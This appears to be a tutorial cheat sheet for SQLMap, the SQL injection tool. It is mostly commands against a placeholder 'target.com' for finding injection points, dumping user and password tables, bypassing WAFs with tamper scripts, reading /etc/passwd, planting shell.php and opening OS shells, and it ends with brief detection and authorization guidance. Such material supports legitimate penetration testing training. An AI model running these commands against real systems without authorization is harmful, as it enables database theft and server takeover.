# 🗄️ SQLMap - Automated SQL Injection Testing Tool

> Automatic SQL injection and database takeover tool

---

## 📌 What is SQLMap?

**SQLMap** is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine and many features for penetration testers.

### Key Features:
- 🎯 **Automatic Detection** - Identifies SQL injection vulnerabilities
- 🗄️ **Database Support** - MySQL, PostgreSQL, Oracle, MSSQL, SQLite, and more
- 💉 **Injection Techniques** - Boolean, time-based, error-based, UNION, stacked queries
- 🔓 **Database Exploitation** - Extract data, access file system, execute commands
- 🚀 **Advanced Features** - WAF bypass, HTTP proxy support, custom payloads

---

## 🚀 Installation

### Kali Linux (Pre-installed)
```bash
# SQLMap comes pre-installed on Kali Linux
sqlmap --help
```

### Ubuntu/Debian
```bash
sudo apt update
sudo apt install sqlmap
```

### From Source (Latest Version)
```bash
# Clone from GitHub
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python3 sqlmap.py --help
```

### Python Installation
```bash
pip3 install sqlmap-python
```

---

## 🎯 Basic Usage

### Simple GET Parameter Testing
```bash
# Test a single parameter
sqlmap -u "http://target.com/page.php?id=1"

# Test multiple parameters
sqlmap -u "http://target.com/search.php?q=test&category=1"

# Specify parameter to test
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id
```

### POST Data Testing
```bash
# Test POST parameters
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# Test from saved request file
sqlmap -r request.txt

# Test specific POST parameter
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" -p user
```

### Cookie and Header Testing
```bash
# Test cookies
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123; user_id=1"

# Test custom headers
sqlmap -u "http://target.com/api" --headers="X-API-Key: test123\nX-User-ID: 1"

# Test User-Agent header
sqlmap -u "http://target.com/page.php" --user-agent="Custom-Agent/1.0"
```

---

## 🔧 Detection and Exploitation Options

### Detection Levels and Risk
```bash
# Increase detection level (1-5, default: 1)
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Increase risk level (1-3, default: 1)
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# Maximum detection (use carefully on production)
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

### Specific Injection Techniques
```bash
# Test specific techniques
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries

sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Test only time-based blind
sqlmap -u "http://target.com/page.php?id=1" --technique=T
```

### Database Enumeration
```bash
# Get basic database information
sqlmap -u "http://target.com/page.php?id=1" --banner --current-user --current-db

# List all databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# List tables in specific database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# List columns in specific table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Dump table data
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump
```

---

## 🛠️ Advanced Features

### 1. Bypassing Protection
```bash
# Random User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Custom User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0..."

# WAF bypass with tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase

# Multiple tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase,space2comment
```

### 2. Authentication Bypass
```bash
# HTTP Basic authentication
sqlmap -u "http://target.com/page.php?id=1" --auth-type=basic --auth-cred="user:pass"

# HTTP Digest authentication
sqlmap -u "http://target.com/page.php?id=1" --auth-type=digest --auth-cred="user:pass"

# Custom authentication headers
sqlmap -u "http://target.com/page.php?id=1" --headers="Authorization: Bearer token123"
```

### 3. Proxy and Traffic Control
```bash
# Use HTTP proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Use SOCKS proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Ignore SSL errors
sqlmap -u "https://target.com/page.php?id=1" --ignore-ssl-errors

# Add delays between requests
sqlmap -u "http://target.com/page.php?id=1" --delay=2

# Randomize delays
sqlmap -u "http://target.com/page.php?id=1" --delay=1-3
```

### 4. File System Access
```bash
# Read files from server
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Write files to server
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# List database files
sqlmap -u "http://target.com/page.php?id=1" --file-list
```

### 5. Operating System Access
```bash
# Execute system commands
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Interactive OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Get registry values (Windows)
sqlmap -u "http://target.com/page.php?id=1" --reg-read --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
```

---

## 💡 Real-World Scenarios

### 1. Web Application Testing
```bash
# Capture request with Burp Suite and save to file
# POST /login HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# 
# username=admin&password=test&submit=Login

# Test the captured request
sqlmap -r burp_request.txt

# Target specific parameter
sqlmap -r burp_request.txt -p username

# Extract data if vulnerable
sqlmap -r burp_request.txt --dbs
sqlmap -r burp_request.txt -D webapp --tables
sqlmap -r burp_request.txt -D webapp -T users --dump
```

### 2. API Endpoint Testing
```bash
# JSON API testing
sqlmap -u "http://api.target.com/users" --data='{"id": 1, "action": "get"}' --method=POST --headers="Content-Type: application/json"

# XML API testing
sqlmap -u "http://api.target.com/soap" --data='<?xml version="1.0"?><soap:Envelope><soap:Body><getUserInfo><userId>1</userId></getUserInfo></soap:Body></soap:Envelope>' --method=POST --headers="Content-Type: text/xml"
```

### 3. Cookie-based Injection
```bash
# Test cookies for injection
sqlmap -u "http://target.com/dashboard.php" --cookie="session_id=abc123; user_id=1*" --level=2

# Specific cookie parameter
sqlmap -u "http://target.com/dashboard.php" --cookie="session_id=abc123; user_id=1" -p user_id
```

### 4. Time-based Blind Injection
```bash
# When other techniques fail, use time-based
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=10

# Optimize for slow connections
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=5 --timeout=30
```

---

## 🎭 WAF Bypass Techniques

### Common Tamper Scripts
```bash
# Space to comment
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment

# Random case
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# Unicode encoding
sqlmap -u "http://target.com/page.php?id=1" --tamper=unionalltounion

# Multiple bypass techniques
sqlmap -u "http://target.com/page.php?id=1" --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

### Custom Tamper Scripts
Create custom tamper script:
```python
#!/usr/bin/env python
# custom_tamper.py

def tamper(payload, **kwargs):
    """
    Custom tamper script for specific WAF
    """
    if payload:
        payload = payload.replace("SELECT", "SeLeCt")
        payload = payload.replace("UNION", "UnIoN")
        payload = payload.replace(" ", "/**/")
    
    return payload
```

Use custom tamper:
```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=custom_tamper
```

---

## 📊 Database-Specific Techniques

### MySQL
```bash
# MySQL-specific enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --current-user --is-dba --users --passwords

# Read MySQL files
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/lib/mysql/mysql/user.MYD"

# MySQL privilege escalation
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT user,password FROM mysql.user"
```

### PostgreSQL
```bash
# PostgreSQL enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbms=postgresql --current-user --current-db

# PostgreSQL command execution
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="id" --dbms=postgresql
```

### Microsoft SQL Server
```bash
# MSSQL enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbms=mssql --current-user --is-dba

# MSSQL extended procedures
sqlmap -u "http://target.com/page.php?id=1" --sql-query="EXEC xp_cmdshell 'whoami'"
```

### Oracle
```bash
# Oracle enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbms=oracle --current-user --current-db

# Oracle file access
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --dbms=oracle
```

---

## 🔍 Advanced Data Extraction

### Selective Data Dumping
```bash
# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C "username,password" --dump

# Dump with WHERE condition
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --where="role='admin'" --dump

# Dump specific number of entries
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --start=1 --stop=10 --dump

# Search for specific data
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --search -C password
```

### Password Hash Cracking
```bash
# Dump password hashes
sqlmap -u "http://target.com/page.php?id=1" --passwords

# Crack hashes with dictionary
sqlmap -u "http://target.com/page.php?id=1" --passwords --password-file=/usr/share/wordlists/rockyou.txt

# Use custom wordlist
sqlmap -u "http://target.com/page.php?id=1" --passwords --password-file=custom_wordlist.txt
```

---

## 🎯 Optimization and Performance

### Speed Optimization
```bash
# Increase threads (default: 1)
sqlmap -u "http://target.com/page.php?id=1" --threads=5

# Skip payload encoding tests
sqlmap -u "http://target.com/page.php?id=1" --skip-urlencode

# Use lightweight payloads
sqlmap -u "http://target.com/page.php?id=1" --technique=B --no-cast

# Optimize for specific DBMS
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql
```

### Session Management
```bash
# Save session to file
sqlmap -u "http://target.com/page.php?id=1" --session-file=session.sqlite

# Resume from session
sqlmap -u "http://target.com/page.php?id=1" --session-file=session.sqlite

# Flush session data
sqlmap -u "http://target.com/page.php?id=1" --flush-session
```

---

## 📚 Learning Exercises

### Beginner Level:
1. **Setup**: Practice on DVWA SQL injection levels
2. **Basic Detection**: Learn to identify different injection types
3. **Manual vs Automated**: Compare manual injection to SQLMap results
4. **Basic Enumeration**: Practice database and table enumeration

### Intermediate Level:
1. **POST Parameters**: Test form-based injection points
2. **Cookie Injection**: Practice cookie-based SQL injection
3. **WAF Bypass**: Learn to use tamper scripts effectively
4. **Custom Payloads**: Create custom injection payloads

### Advanced Level:
1. **Second-Order Injection**: Test for complex injection scenarios
2. **Blind Injection**: Master time-based and boolean-based techniques
3. **Automation**: Integrate SQLMap into testing workflows
4. **Custom Scripts**: Write custom tamper and payload scripts

---

## 🛡️ Defensive Measures

Understanding how SQLMap works helps in defense:

### Detection Signatures
```bash
# Common SQLMap signatures in logs:
# User-Agent: sqlmap/1.x.x
# High number of requests with similar patterns
# Specific payload patterns in parameters
# Error messages indicating SQL syntax issues
```

### WAF Rules
```bash
# Block common SQLMap patterns
# Monitor for multiple database error messages
# Rate limiting on parameter testing
# Signature-based detection of injection attempts
```

---

## ⚖️ Legal and Ethical Guidelines

### ✅ Authorized Testing
- Only test applications you own or have written permission to test
- Follow responsible disclosure practices
- Document all findings professionally
- Respect rate limits and server resources

### 🚫 Illegal Activities
- Never use SQLMap against systems without permission
- Don't extract sensitive data without authorization
- Avoid damaging or modifying database contents
- Don't ignore terms of service or legal warnings

---

## 🔗 Quick Reference Commands

```bash
# Basic vulnerability scan
sqlmap -u "http://target.com/page.php?id=1"

# Test POST data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Test from saved request
sqlmap -r request.txt

# Database enumeration
sqlmap -u "target" --dbs --tables --columns

# Data extraction
sqlmap -u "target" -D database -T table --dump

# File operations
sqlmap -u "target" --file-read="/etc/passwd"
sqlmap -u "target" --file-write="shell.php" --file-dest="/var/www/shell.php"

# OS command execution
sqlmap -u "target" --os-shell

# WAF bypass
sqlmap -u "target" --tamper=space2comment,randomcase

# Stealth mode
sqlmap -u "target" --random-agent --delay=3 --technique=T
```

---

<div class="notice--warning">
  <h4>🚨 Critical Security Warning</h4>
  <p>SQLMap is an extremely powerful tool that can extract sensitive data, modify databases, and compromise entire systems. Only use it on systems you own or have explicit authorization to test. Unauthorized use is illegal and unethical.</p>
</div>

---

*SQLMap is an essential tool for database security testing. Use it responsibly to help organizations identify and fix SQL injection vulnerabilities before malicious attackers can exploit them.*